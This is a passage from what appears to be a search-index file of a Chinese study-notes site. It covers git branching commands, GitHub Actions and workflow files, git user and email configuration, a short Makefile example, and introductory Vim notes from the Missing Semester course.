\u4e4b\u524d\u7684\u63d0\u4ea4 \u2026</li> </ul> </li> </ul> branch &amp; checkout <ul> <li><code>branch</code><ul> <li><code>git branch</code> \u6216 <code>git branch -l</code> \u5217\u51fa\u672c\u5730\u5206\u652f</li> <li><code>git branch -r</code> \u5217\u51fa\u8fdc\u7a0b\u5206\u652f</li> <li><code>git branch -a</code> \u5217\u51fa\u672c\u5730\u5206\u652f\u548c\u8fdc\u7a0b\u5206\u652f</li> <li><code>git branch &lt;branch&gt;</code> \u521b\u5efa\u5206\u652f</li> <li><code>git branch -d &lt;branch&gt;</code> \u5220\u9664\u5206\u652f; <code>-D</code> \u5f3a\u5236\u5220\u9664</li> <li><code>git branch -m &lt;old&gt; &lt;new&gt;</code> \u91cd\u547d\u540d\u5206\u652f; <code>-M</code> \u5f3a\u5236\u91cd\u547d\u540d</li> <li><code>git branch -u &lt;remote&gt;/&lt;branch&gt;</code> \u8bbe\u7f6e\u672c\u5730\u5206\u652f\u8ddf\u8e2a\u8fdc\u7a0b\u5206\u652f</li> <li>\u2026</li> </ul> </li> <li><code>checkout</code><ul> <li><code>git checkout &lt;branch&gt;</code> \u5207\u6362\u5206\u652f</li> <li><code>git checkout -b &lt;branch&gt;</code> \u521b\u5efa\u5e76\u5207\u6362\u5230\u5206\u652f</li> <li><code>git checkout -b &lt;branch&gt; origin/&lt;remote branch&gt;</code> \u521b\u5efa\u5e76\u5207\u6362\u5230\u5206\u652f\uff0c\u4e14\u8ddf\u8e2a\u8fdc\u7a0b\u5206\u652f</li> <li>\u2026</li> </ul> </li> </ul> <p>To Be Continued</p>"}, {"location": "Triviality/GitHub/action/", "title": "GitHub Actions", "text": "<p> \u7ea6 457 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p>"}, {"location": "Triviality/GitHub/action/#github-actions_1", "title": "GitHub Actions \u662f\u4ec0\u4e48\uff1f", "text": "<p>Abstract</p> <ul> <li>GitHub Actions \u662f\u4e00\u79cd\u6301\u7eed\u96c6\u6210\u548c\u6301\u7eed\u4ea4\u4ed8 (CI/CD) \u5e73\u53f0\uff0c\u53ef\u7528\u4e8e\u81ea\u52a8\u6267\u884c\u751f\u6210\u3001\u6d4b\u8bd5\u548c\u90e8\u7f72\u7ba1\u9053\u3002 \u60a8\u53ef\u4ee5\u521b\u5efa\u5de5\u4f5c\u6d41\u7a0b\u6765\u6784\u5efa\u548c\u6d4b\u8bd5\u5b58\u50a8\u5e93\u7684\u6bcf\u4e2a\u62c9\u53d6\u8bf7\u6c42\uff0c\u6216\u5c06\u5408\u5e76\u7684\u62c9\u53d6\u8bf7\u6c42\u90e8\u7f72\u5230\u751f\u4ea7\u73af\u5883\u3002</li> <li>GitHub Actions \u4e0d\u4ec5\u4ec5\u662f DevOps\uff0c\u8fd8\u5141\u8bb8\u60a8\u5728\u5b58\u50a8\u5e93\u4e2d\u53d1\u751f\u5176\u4ed6\u4e8b\u4ef6\u65f6\u8fd0\u884c\u5de5\u4f5c\u6d41\u7a0b\u3002 \u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c\u5de5\u4f5c\u6d41\u7a0b\uff0c\u4ee5\u4fbf\u5728\u6709\u4eba\u5728\u60a8\u7684\u5b58\u50a8\u5e93\u4e2d\u521b\u5efa\u65b0\u95ee\u9898\u65f6\u81ea\u52a8\u6dfb\u52a0\u76f8\u5e94\u7684\u6807\u7b7e\u3002</li> <li>GitHub \u63d0\u4f9b Linux\u3001Windows \u548c macOS \u865a\u62df\u673a\u6765\u8fd0\u884c\u5de5\u4f5c\u6d41\u7a0b\uff0c\u6216\u8005\u60a8\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u6570\u636e\u4e2d\u5fc3\u6216\u4e91\u57fa\u7840\u67b6\u6784\u4e2d\u6258\u7ba1\u81ea\u5df1\u7684\u81ea\u6258\u7ba1\u8fd0\u884c\u5668\u3002</li> </ul> <p>\u9996\u5148\uff0c\u4e00\u4e2a\u6301\u7eed\u96c6\u6210\u4f1a\u7531\u5f88\u591a\u64cd\u4f5c\u7ec4\u6210\uff0c\u6bd4\u5982\u6293\u53d6\u4ee3\u7801\u3001\u8fd0\u884c\u6d4b\u8bd5\u3001\u767b\u5f55\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u53d1\u5e03\u5230\u7b2c\u4e09\u65b9\u670d\u52a1\u7b49\u7b49\u3002GitHub \u628a\u8fd9\u4e9b\u64cd\u4f5c\u5c31\u79f0\u4e3a actions\u3002</p> <p>\u7528\u6237\u53ef\u4ee5\u5728 \u5b98\u65b9\u5e02\u573a \u6216 awesome actions \u641c\u7d22\u5230\u522b\u4eba\u63d0\u4ea4\u7684 actions \u811a\u672c</p> <p>\u56e0\u4e3a\uff0c\u6bcf\u4e2a action \u5c31\u662f\u4e00\u4e2a\u72ec\u7acb\u811a\u672c\uff0c\u56e0\u6b64\u53ef\u4ee5\u505a\u6210\u4ee3\u7801\u4ed3\u5e93\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>userName/repoName</code> \u7684\u8bed\u6cd5\u5f15\u7528 <code>action</code>\u3002\u6bd4\u5982\uff0c <code>actions/setup-node</code> \u5c31\u8868\u793a <code>github.com/actions/setup-node</code> \u8fd9\u4e2a\u4ed3\u5e93\uff0c\u5b83\u4ee3\u8868\u4e00\u4e2a <code>action</code>\uff0c\u4f5c\u7528\u662f\u5b89\u88c5 <code>Node.js</code>\u3002</p> <p>Success</p> <p>\u4e8b\u5b9e\u4e0a\uff0cGitHub \u5b98\u65b9\u7684 actions \u90fd\u653e\u5728 github.com/actions \u91cc\u9762</p>"}, {"location": "Triviality/GitHub/action/#workflow", "title": "Workflow \u6587\u4ef6", "text": "<p>Workflow \u6587\u4ef6</p> <ul> <li><code>GitHub Actions</code> \u7684\u914d\u7f6e\u6587\u4ef6\u53eb\u505a <code>workflow</code> \u6587\u4ef6\uff0c\u5b58\u653e\u5728\u4ee3\u7801\u4ed3\u5e93\u7684 <code>.github/workflows/</code> \u76ee\u5f55\u4e0b</li> <li><code>workflow/</code> \u4e0b\u7684\u6587\u4ef6\u91c7\u7528 <code>YAML</code> \u683c\u5f0f\uff0c\u6587\u4ef6\u540d\u53ef\u4ee5\u4efb\u610f\u53d6\uff0c\u4f46\u662f\u540e\u7f00\u540d\u7edf\u4e00\u4e3a <code>yml</code> \u6216\u8005 <code>yaml</code></li> <li>\u4e00\u4e2a\u5e93\u53ef\u4ee5\u6709\u591a\u4e2a <code>workflow</code> \u6587\u4ef6\u3002GitHub \u53ea\u8981\u53d1\u73b0 <code>.github/workflows</code> \u76ee\u5f55\u4e0b\u91cc\u9762\u6709 <code>yml</code>/<code>yaml</code> \u6587\u4ef6\uff0c\u5c31\u4f1a\u81ea\u52a8\u8fd0\u884c\u8be5\u6587\u4ef6\u3002</li> </ul> <p>\u4e0b\u9762\u7b80\u5355\u4ecb\u7ecd <code>workflow</code> \u6587\u4ef6\u7684\u5b57\u6bb5\uff1a</p> reference <ul> <li>https://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html</li> <li>https://docs.github.com/zh/actions/learn-github-actions/understanding-github-actions</li> </ul>"}, {"location": "Triviality/GitHub/docs/", "title": "Quickstart | \u6280\u672f\u6587\u6863\u9605\u8bfb", "text": "<p> \u7ea6 1326 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"}, {"location": "Triviality/GitHub/docs/#hello-world", "title": "Hello World", "text": "<ol> <li>Creating a repository</li> <li>Creating a branch<ol> <li>\u901a\u8fc7\u521b\u5efa\u5206\u652f\u540c\u65f6\u62e5\u6709 \u4e0d\u540c\u7248\u672c\u7684\u5b58\u50a8\u5e93 </li> <li>\u9ed8\u8ba4\u5206\u652f master , \u4ece master \u521b\u5efa\u7684\u65b0\u5206\u652f\u662f\u5176\u526f\u672c\u6216\u5feb\u7167\u3002\u82e5\u534f\u4f5c\u8005\u5bf9 master \u5206\u652f\u8fdb\u884c\u4e86\u66f4\u65b0, \u4f60\u53ef\u62c9\u53d6\u8fd9\u4e9b\u66f4\u65b0</li> </ol> </li> <li>Making and committing changes<ol> <li>\u521b\u5efa\u65b0\u5206\u652f\u540e, GitHub \u4f1a\u5c06\u4f60\u8f6c\u5230\u5176\u65b0\u5206\u652f\u4ee3\u7801\u9875</li> <li>\u5728\u65b0\u5206\u652f\u4e0b commit \u66f4\u6539\u540e, \u8fd9\u4e9b\u66f4\u6539\u4ec5\u9002\u7528\u4e8e\u5f53\u524d\u64cd\u4f5c\u5206\u652f</li> </ol> </li> <li>Opening a pull request<ol> <li>\u5728\u65b0\u5206\u652f commit \u540e, \u53ef\u6253\u5f00 pull request (GitHub \u4e0a\u534f\u4f5c\u7684\u6838\u5fc3)</li> <li>pull request \u53ef\u663e\u793a\u4e24\u4e2a\u5206\u652f\u5185\u5bb9\u7684\u5dee\u5f02(\u53ea\u8981\u8fdb\u884c\u63d0\u4ea4, \u4fbf\u53ef pull request \u5e76\u5f00\u59cb\u8ba8\u8bba)</li> <li>\u5728 pull request \u4e2d\u4f7f\u7528 @mention \u529f\u80fd, \u53ef\u5411\u7279\u5b9a\u56e2\u961f\u6216\u4eba\u5458\u8bf7\u6c42 comment</li> </ol> </li> <li>Merging your pull request<ol> <li>pull request \u540e, \u5c06\u65b0\u5206\u652f\u7684\u66f4\u6539\u518d\u5408\u5e76\u5230 master  </li> <li>\u6709\u65f6, pull request \u53ef\u80fd\u4f1a\u5f15\u5165\u4e0e master \u4e0a\u73b0\u6709\u4ee3\u7801\u51b2\u7a81\u7684\u4ee3\u7801\u66f4\u6539\u3002\u5982\u679c\u5b58\u5728\u4efb\u4f55\u51b2\u7a81, GitHub \u5c06\u63d0\u9192\u60a8\u6709\u5173\u51b2\u7a81\u4ee3\u7801\u7684\u4fe1\u606f\uff0c\u5e76\u9632\u6b62\u5408\u5e76\uff0c\u76f4\u5230\u51b2\u7a81\u89e3\u51b3\u4e3a\u6b62\u3002\u60a8\u53ef\u4ee5\u8fdb\u884c\u89e3\u51b3\u51b2\u7a81\u7684\u63d0\u4ea4\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u62c9\u53d6\u8bf7\u6c42\u4e2d\u7684\u6ce8\u91ca\u4e0e\u56e2\u961f\u6210\u5458\u8ba8\u8bba\u51b2\u7a81</li> <li>\u63a5\u4e0b\u6765\u53ef\u5b89\u5168\u5220\u9664\u65b0\u5efa\u5206\u652f, \u82e5\u8981\u5bf9\u9879\u76ee\u8fdb\u884c\u66f4\u591a\u66f4\u6539, \u53ef\u968f\u65f6\u521b\u65b0\u65b0\u5206\u652f\u5e76\u91cd\u590d\u6b64\u8fc7\u7a0b(\u534f\u4f5c\u91cd\u8981\u4e00\u73af)</li> </ol> </li> </ol>"}, {"location": "Triviality/GitHub/docs/#set-up-git", "title": "Set up Git", "text": "<p>Quote</p> <p>At the heart of GitHub is an open source version control system (VCS) called Git. Git is responsible for everything GitHub-related that happens locally on your computer.</p>"}, {"location": "Triviality/GitHub/docs/#using-git", "title": "Using Git", "text": "<ul> <li>\u914d\u7f6e <p>\u5b98\u65b9\u6587\u6863 </p> </li> </ul>"}, {"location": "Triviality/GitHub/docs/#setting-up-git", "title": "Setting up Git", "text": "<ul> <li>\u4e0b\u8f7d\u5e76\u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684 Git <p>Git</p> </li> </ul>"}, {"location": "Triviality/GitHub/docs/#git", "title": "\u5728 Git \u4e2d\u8bbe\u7f6e\u7528\u6237\u540d", "text": "<ol> <li>\u5173\u4e8e Git \u7528\u6237\u540d<ol> <li>\u4f7f\u7528 <code>git config</code> \u547d\u4ee4\u66f4\u6539\u4e0e Git \u63d0\u4ea4\u5173\u8054\u7684\u540d\u79f0  <p>\u4f7f\u7528 <code>git config</code> \u66f4\u6539\u4e0e Git \u63d0\u4ea4\u5173\u8054\u7684\u540d\u79f0\u4ec5\u5f71\u54cd\u672a\u6765\u7684\u63d0\u4ea4\uff0c\u800c\u4e0d\u4f1a\u66f4\u6539\u7528\u4e8e\u8fc7\u53bb\u63d0\u4ea4\u7684\u540d\u79f0</p> </li> </ol> </li> <li>\u4e3a\u8ba1\u7b97\u673a\u4e0a\u7684\u6bcf\u4e2a\u5b58\u50a8\u5e93\u8bbe\u7f6e Git \u7528\u6237\u540d<ol> <li>\u6253\u5f00 \u7ec8\u7aef(Mac/Linux) || Git Bash(Windows)</li> <li>\u8bbe\u7f6e Git \u7528\u6237\u540d:  <p>$ git config \u2013global user.name \u201cMoLan\u201d</p> </li> <li>\u786e\u8ba4\u6b63\u786e\u8bbe\u7f6e\u4e86\u7528\u6237\u540d:  <p>$ git config \u2013global user.name  MoLan</p> </li> </ol> </li> <li>\u4e3a\u4e00\u4e2a\u4ed3\u5e93\u8bbe\u7f6e Git \u7528\u6237\u540d<ol> <li>\u6253\u5f00 \u7ec8\u7aef(Mac/Linux) || Git Bash(Windows)</li> <li>\u5c06\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u66f4\u6539\u4e3a\u8981\u914d\u7f6e\u4e0e Git \u63d0\u4ea4\u5173\u8054\u7684\u540d\u79f0\u7684\u672c\u5730\u4ed3\u5e93</li> <li>\u8bbe\u7f6e Git \u7528\u6237\u540d:   <p>$ git config user.name \u201cMoLan\u201d</p> </li> <li>\u786e\u8ba4:   <p>$ git config user.name  MoLan</p> </li> </ol> </li> </ol>"}, {"location": "Triviality/GitHub/docs/#git_1", "title": "\u5728 Git \u4e2d\u8bbe\u7f6e\u63d0\u4ea4\u7535\u5b50\u90ae\u4ef6\u5730\u5740", "text": "<ul> <li>\u5173\u4e8e\u63d0\u4ea4\u7535\u5b50\u90ae\u4ef6\u5730\u5740<ul> <li>\u82e5\u60f3\u5c06\u4e2a\u4eba\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u8bbe\u4e3a\u79c1\u5bc6, \u53ef\u4f7f\u7528 GitHub \u7684 <code>noreply</code> \u7535\u5b50\u90ae\u4ef6\u5730\u5740\u4f5c\u4e3a\u63d0\u4ea4\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u8981\u5c06 <code>noreply</code> \u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7528\u4e8e\u4ece\u547d\u4ee4\u884c\u63a8\u9001\u7684\u63d0\u4ea4\uff0c\u8bf7\u5728 Git \u4e2d\u8bbe\u7f6e\u63d0\u4ea4\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u65f6\u4f7f\u7528\u8be5\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002 \u8981\u5c06 <code>noreply</code> \u5730\u5740\u7528\u4e8e\u57fa\u4e8e Web \u7684 Git \u64cd\u4f5c\uff0c\u8bf7\u5728 GitHub \u4e0a\u8bbe\u7f6e\u63d0\u4ea4\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u5e76\u9009\u62e9 \u201cKeep my email address private\u201d</li> </ul> </li> </ul> <p>Note</p> <p>2017 \u5e74 7 \u6708 18 \u65e5\u540e\u6ce8\u518c\u8d26\u6237\u7684, \u6765\u81ea GitHub \u7684 <code>noreply</code> \u7535\u5b50\u90ae\u4ef6\u5730\u5740\u662f <code>USERNAME@user.noreply.github.com</code> \u3002\u53ef\u901a\u8fc7\u5728\u7535\u5b50\u90ae\u4ef6\u8bbe\u7f6e\u4e2d\u9009\u62e9(\u6216\u91cd\u65b0\u9009\u62e9) \u201cKeep my email address private\u201d , \u4e3a GitHub \u83b7\u53d6\u57fa\u4e8e ID \u7684 <code>noreply</code> \u7535\u5b50\u90ae\u4ef6\u5730\u5740 </p> <ul> <li>\u5728 GitHub \u4e0a\u8bbe\u7f6e\u63d0\u4ea4\u7535\u5b50\u90ae\u4ef6\u5730\u5740<ul> <li>\u82e5\u5c1a\u672a\u542f\u7528\u7535\u5b50\u90ae\u4ef6\u9690\u79c1\u4fdd\u62a4, \u5219\u5728 GitHub \u4e0a\u7f16\u8f91\u3001\u5220\u9664\u6216\u521b\u5efa\u6587\u4ef6\u6216\u8005\u5408\u5e76\u62c9\u53d6\u8bf7\u6c42\u65f6\uff0c\u53ef\u4ee5\u9009\u62e9\u5c06\u4f5c\u8005\u66f4\u6539\u63d0\u4ea4\u5230\u54ea\u4e2a\u7ecf\u9a8c\u8bc1\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002 \u5982\u679c\u542f\u7528\u4e86\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u9690\u79c1\uff0c\u5219\u4e0d\u80fd\u66f4\u6539\u63d0\u4ea4\u4f5c\u8005\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f <code>&lt;username&gt;@users.noreply.github.com</code> 1. \u5728 GitHub Settings \u6dfb\u52a0\u7535\u5b50\u90ae\u4ef6\u5730\u5740 2. \u9a8c\u8bc1\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002<ol> <li>\u5728 \u201cPrimary email address\u201d \u5217\u8868\u4e2d\u9009\u62e9\u8981\u4e0e\u57fa\u4e8e Web \u7684 Git \u64cd\u4f5c\u5173\u8054\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740 </li> <li>\u82e5\u8981\u5728\u6267\u884c\u57fa\u4e8e web \u7684 Git \u64cd\u4f5c\u65f6\u5bf9\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u4fdd\u5bc6, \u5355\u51fb \u201cKeep my email addresses private\u201d </li> </ol> </li> </ul> </li> <li>\u4e3a\u8ba1\u7b97\u673a\u4e0a\u7684\u6bcf\u4e2a\u4ed3\u5e93\u8bbe\u7f6e\u7535\u5b50\u90ae\u4ef6\u5730\u5740<ol> <li>\u6253\u5f00 \u7ec8\u7aef(Mac/Linux) || Git Bash(Windows)</li> <li>\u5728 Git \u4e2d\u8bbe\u7f6e\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002\u53ef\u4ee5\u4f7f\u7528 GitHub \u63d0\u4f9b\u7684 noreply \u7535\u5b50\u90ae\u4ef6\u5730\u5740\u6216\u5176\u4f59\u7535\u5b50\u90ae\u4ef6\u5730\u5740 <p>$ git config \u2013global user.email \u201cYOUR_EMAIL\u201d</p> </li> <li>\u786e\u8ba4\u5728 Git \u4e2d\u6b63\u786e\u8bbe\u7f6e\u4e86\u7535\u5b50\u90ae\u4ef6\u5730\u5740:  <p>$ git config \u2013global user.email email@example.com</p> </li> <li>\u5c06\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u6dfb\u52a0\u5230 GitHub \u4e0a\u7684\u8d26\u6237\uff0c\u4ee5\u4fbf\u63d0\u4ea4\u5f52\u5c5e\u4e8e\u4f60\u5e76\u663e\u793a\u5728\u4f60\u7684\u8d21\u732e\u56fe\u4e2d</li> </ol> </li> <li>\u4e3a\u4e00\u4e2a\u4ed3\u5e93\u8bbe\u7f6e\u7535\u5b50\u90ae\u4ef6\u5730\u5740<ol> <li>\u6253\u5f00 \u7ec8\u7aef(Mac/Linux) || Git Bash(Windows)</li> <li>\u5c06\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u66f4\u6539\u4e3a\u60a8\u60f3\u8981\u5728\u5176\u4e2d\u914d\u7f6e\u4e0e Git \u63d0\u4ea4\u5173\u8054\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7684\u672c\u5730\u4ed3\u5e93</li> <li>\u5728 Git \u4e2d\u8bbe\u7f6e\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002\u53ef\u4ee5\u4f7f\u7528 GitHub \u63d0\u4f9b\u7684 noreply \u7535\u5b50\u90ae\u4ef6\u5730\u5740\u6216\u5176\u4f59\u7535\u5b50\u90ae\u4ef6\u5730\u5740 <p>$ git config user.email \u201cYOUR_EMAIL\u201d</p> </li> <li>\u786e\u8ba4\u5728 Git \u4e2d\u6b63\u786e\u8bbe\u7f6e\u4e86\u7535\u5b50\u90ae\u4ef6\u5730\u5740:  <p>$ git config user.email email@example.com</p> </li> <li>\u5c06\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u6dfb\u52a0\u5230 GitHub \u4e0a\u7684\u8d26\u6237\uff0c\u4ee5\u4fbf\u63d0\u4ea4\u5f52\u5c5e\u4e8e\u4f60\u5e76\u663e\u793a\u5728\u4f60\u7684\u8d21\u732e\u56fe\u4e2d</li> </ol> </li> </ul>"}, {"location": "Triviality/GitHub/docs/#authenticating-with-github-from-git", "title": "Authenticating with GitHub from Git", "text": "<ul> <li>\u4ece Git\u8fde\u63a5\u5230 GitHub \u5b58\u50a8\u5e93\u65f6\uff0c\u9700\u8981\u4f7f\u7528 HTTPS \u6216 SSH \u5411 GitHub \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1</li> </ul>"}, {"location": "Triviality/GitHub/docs/#https", "title": "\u901a\u8fc7 HTTPS \u8fde\u63a5", "text": "<ul> <li>\u82e5\u4f7f\u7528 HTTPS \u514b\u9686\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e\u5e2e\u52a9\u7a0b\u5e8f\u5728 Git \u4e2d\u7f13\u5b58 GitHub \u51ed\u636e</li> </ul>"}, {"location": "Triviality/GitHub/docs/#create-a-repo", "title": "Create a repo", "text": ""}, {"location": "Triviality/GitHub/docs/#fork-a-repo", "title": "Fork a repo", "text": ""}, {"location": "Triviality/GitHub/docs/#github-flow", "title": "GitHub flow", "text": ""}, {"location": "Triviality/GitHub/docs/#contributing-to-projects", "title": "Contributing to projects", "text": ""}, {"location": "Triviality/GitHub/docs/#be-social", "title": "Be social", "text": ""}, {"location": "Triviality/GitHub/docs/#communicating-on-github", "title": "Communicating on GitHub", "text": ""}, {"location": "Triviality/GitHub/docs/#github-glossary", "title": "GitHub glossary", "text": ""}, {"location": "Triviality/GitHub/docs/#git-cheatsheet", "title": "Git cheatsheet", "text": ""}, {"location": "Triviality/GitHub/docs/#learning-resources", "title": "Learning resources", "text": "<p>To Be Continued</p>"}, {"location": "Triviality/Makefile/", "title": "Index", "text": "<p> \u7ea6 3 \u4e2a\u5b57  11 \u884c\u4ee3\u7801 </p> <p>Example</p> <pre><code>C_SRC       = $(sort $(wildcard *.c))\nOBJ         = $(patsubst %.c,%.o,$(C_SRC))\n\nfile = main.o\nall:$(OBJ)\n\n%.o:%.c\n    ${GCC} ${CFLAG} -c $&lt;\nclean:\n    $(shell rm *.o 2&gt;/dev/null)\n</code></pre> <p>Quote</p> <p>CSDN</p>"}, {"location": "Triviality/The%20Missing%20Semester/", "title": "perface", "text": "<p> \u7ea6 52 \u4e2a\u5b57 </p> <p>Note</p> <p>The Misssing Semester of CS Education \u662fMIT\u63a8\u51fa\u7684CS\u8bfe\u7a0b\uff0c\u4e3b\u8981\u8bb2\u8ff0\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\u5f88\u57fa\u7840\u4e14\u91cd\u8981\u4f46\u4e0d\u4f1a\u51fa\u73b0\u5728CS\u4e3b\u6d41\u8bfe\u7a0b\u4e2d\u7684\u4e00\u4e9b\u77e5\u8bc6\u3002</p> Quote <p>Youtube Bilibili</p>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/", "title": "Vim", "text": "<p> \u7ea6 1880 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>\u5feb\u901f\u5165\u95e8</p> <p>\u5b89\u88c5\u540e\u76f4\u63a5\u5728\u7ec8\u7aef\u952e\u5165 <code>vimtutor</code> \u5373\u53ef\u8fdb\u5165 Vim \u7684\u6559\u7a0b</p>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_1", "title": "\u8be5\u5b66\u54ea\u4e2a\u7f16\u8f91\u5668\uff1f", "text": "<ul> <li>Visual Studio Code \u662f\u76ee\u524d\u6700\u6d41\u884c\u7684\u4ee3\u7801\u7f16\u8f91\u5668\u3002\u800c Vim \u5219\u662f\u6700\u6d41\u884c\u7684\u57fa\u4e8e\u547d\u4ee4\u884c\u7684\u7f16\u8f91\u5668\u3002</li> <li>REPL\u53ea\u4ea4\u4e92\u5f0f\u7684\u7f16\u7a0b\u73af\u5883\uff0c\u4e5f\u80fd\u6307\u4ee3\u547d\u4ee4\u884c\u7684\u6a21\u5f0f</li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#vim_1", "title": "Vim\u7684\u54f2\u5b66", "text": "<ul> <li>\u5728\u7f16\u7a0b\u7684\u65f6\u5019\uff0c\u4f60\u4f1a\u628a\u5927\u91cf\u65f6\u95f4\u82b1\u5728\u9605\u8bfb/\u7f16\u8f91\u800c\u4e0d\u662f\u5728\u5199\u4ee3\u7801\u4e0a\u3002\u6240\u4ee5\uff0cVim \u662f\u4e00\u4e2a\u591a\u6a21\u6001\u7f16\u8f91\u5668\uff1a\u5b83\u5bf9\u4e8e\u63d2\u5165\u6587\u5b57\u548c\u64cd\u7eb5\u6587\u5b57\u6709\u4e0d\u540c\u7684\u6a21\u5f0f\u3002Vim \u662f\u53ef\u7f16\u7a0b\u7684\uff08\u53ef\u4ee5\u4f7f\u7528 Vimscript \u6216\u8005\u50cf Python \u4e00\u6837\u7684\u5176\u4ed6\u7a0b\u5e8f\u8bed\u8a00\uff09\uff0cVim \u7684\u63a5\u53e3\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u7a0b\u5e8f\u8bed\u8a00\uff1a\u952e\u5165\u64cd\u4f5c\uff08\u4ee5\u53ca\u5176\u52a9\u8bb0\u540d\uff09 \u662f\u547d\u4ee4\uff0c\u8fd9\u4e9b\u547d\u4ee4\u4e5f\u662f\u53ef\u7ec4\u5408\u7684\u3002Vim \u907f\u514d\u4e86\u4f7f\u7528\u9f20\u6807\uff0c\u56e0\u4e3a\u90a3\u6837\u592a\u6162\u4e86\uff1bVim \u751a\u81f3\u907f\u514d\u7528\u4e0a\u4e0b\u5de6\u53f3\u952e\u56e0\u4e3a\u90a3\u6837\u9700\u8981\u592a\u591a\u7684\u624b\u6307\u79fb\u52a8\u3002</li> <li>\u8fd9\u6837\u7684\u8bbe\u8ba1\u54f2\u5b66\u4f7f\u5f97 Vim \u6210\u4e3a\u4e86\u4e00\u4e2a\u80fd\u8ddf\u4e0a\u4f60\u601d\u7ef4\u901f\u5ea6\u7684\u7f16\u8f91\u5668</li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_2", "title": "\u547d\u4ee4", "text": "<ul> <li>\u9ed8\u8ba4Normal\u6a21\u5f0f\uff0cNormal\u6a21\u5f0f\u4e0b\u6309 i \u5c06\u8fdb\u5165Insert\u6a21\u5f0f\uff0c\u800c\u5728Insert\u6a21\u5f0f\u4e0b\u6309Esc\u53ef\u4ee5\u8fd4\u56deNormal\u6a21\u5f0f <p>\u6309\u952e\u4e66\u5199\uff1a\u4f8b\u5982\u5982\u679c\u662f\u5355\u72ec\u7684\u6309\u952e i \uff0c\u90a3\u4e48\u76f4\u63a5\u5199 i \u5c31\u53ef\u4ee5\u4e86\uff0c \u5982\u679c\u662fCtrl + V\u8fd9\u79cd\u6309\u952e\u7ec4\u5408\uff0c\u6709\u4e0b\u9762\u51e0\u79cd\u8868\u793a\u65b9\u6cd5       1. <code>^V</code>\uff1a\u4e00\u4e2a\u201c\u8131\u5b57\u7b26\u53f7\u201d\u540e\u9762\u8ddf\u7740\u63a7\u5236\u7528\u5b57\u7b26\uff08\u8fd9\u91cc\u7684\u63a7\u5236\u7528\u5b57\u7b26\u6307\u90a3\u4e2aV\uff0c\u4e5f\u5c31\u662f\u7ec4\u5408\u952e\u4e2d \u7684\u53e6\u4e00\u4e2a\u952e\uff09       2. <code>Ctrl - V</code>        3. <code>&lt; C - V&gt;</code> </p> </li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_3", "title": "\u5404\u79cd\u6a21\u5f0f", "text": "<ol> <li> <p>Normal\u6a21\u5f0f\uff08\u6b63\u5e38\uff09\u2014\u2014&gt;\u662f\u7528\u6765\u79fb\u52a8\u5149\u6807\u3001\u9605\u8bfb\u4e1c\u897f\u4ee5\u53ca\u5728\u6587\u4ef6\u95f4\u5207\u6362\u7684</p> <p><code>x</code> \u53ef\u4ee5\u5220\u9664\u5b57\u7b26</p> </li> <li> <p>Insert\u6a21\u5f0f\uff08\u63d2\u5165\uff09\u2014\u2014&gt;\u6309\u4e0b <code>i</code> \u952e\u8fdb\u5165\uff0c\u7528\u6765\u8f93\u5165\u7684</p> <p>\u56e0\u6b64\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u4f60\u7684\u6309\u952e\u5927\u591a\u4f1a\u76f4\u63a5\u8fdb\u5165buffer</p> </li> <li> <p>Replace\u6a21\u5f0f\uff08\u66ff\u6362\uff09\u2014\u2014&gt;\u6309\u4e0b <code>R</code> \u8fdb\u5165\uff0c\u4e0d\u50cf\u63d2\u5165\u6a21\u5f0f\u4f1a\u628a\u5b57\u7b26\u5f80\u540e\u79fb\uff0c\u66ff\u6362\u6a21\u5f0f\u4f1a\u76f4\u63a5\u8986\u76d6\u6389\u6587\u672c</p> </li> <li>Visual\u6a21\u5f0f\uff08\u53ef\u89c6\u5316\uff09<ol> <li>Visual\uff08\u4e00\u822c\uff09\u2014\u2014&gt;\u6309\u4e0b <code>v</code> \u952e\u8fdb\u5165\uff0c</li> <li>Visual Line\uff08\u884c\uff09\u2014\u2014&gt;\u6309\u4e0b <code>Shift + v</code> \u8fdb\u5165\uff0c</li> <li>Visual Block\uff08\u5757\uff09\u2014\u2014&gt; \u6309\u4e0b <code>Ctrl + v</code> \u8fdb\u5165\uff0c</li> </ol> </li> 